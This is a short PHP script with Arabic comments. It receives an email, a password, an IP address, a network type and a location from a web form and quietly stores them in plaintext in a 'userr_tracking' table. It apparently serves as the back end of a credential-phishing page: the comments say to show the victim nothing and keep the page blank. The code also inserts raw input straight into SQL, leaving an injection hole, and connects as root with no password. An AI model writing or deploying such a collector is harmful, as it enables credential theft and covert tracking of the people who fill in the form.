<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "myy_database";

// إنشاء الاتصال
$conn = new mysqli($servername, $username, $password, $dbname);

// التحقق من الاتصال
if ($conn->connect_error) {
    die("فشل الاتصال: " . $conn->connect_error);
}

// استلام البيانات
$email = $_POST['email'] ?? '';
$pass = $_POST['pass'] ?? '';
$ip_address = $_POST['ip_address'] ?? '';
$network_type = $_POST['network_type'] ?? '';
$location = $_POST['location'] ?? '';

// إدخال البيانات في قاعدة البيانات
$sql = "INSERT INTO userr_tracking (email, password, ip_address, network_type, location) 
        VALUES ('$email', '$pass', '$ip_address', '$network_type', '$location')";

if ($conn->query($sql) === TRUE) {
    // لا تعرض أي رسالة أو تقم بإعادة توجيه المستخدم
    // الصفحة تبقى فارغة
} else {
    // في حالة حدوث خطأ، يمكنك تسجيل الخطأ في ملف سجل أو قاعدة بيانات
    // لكن لا تعرض أي رسالة للمستخدم
}

$conn->close();
?>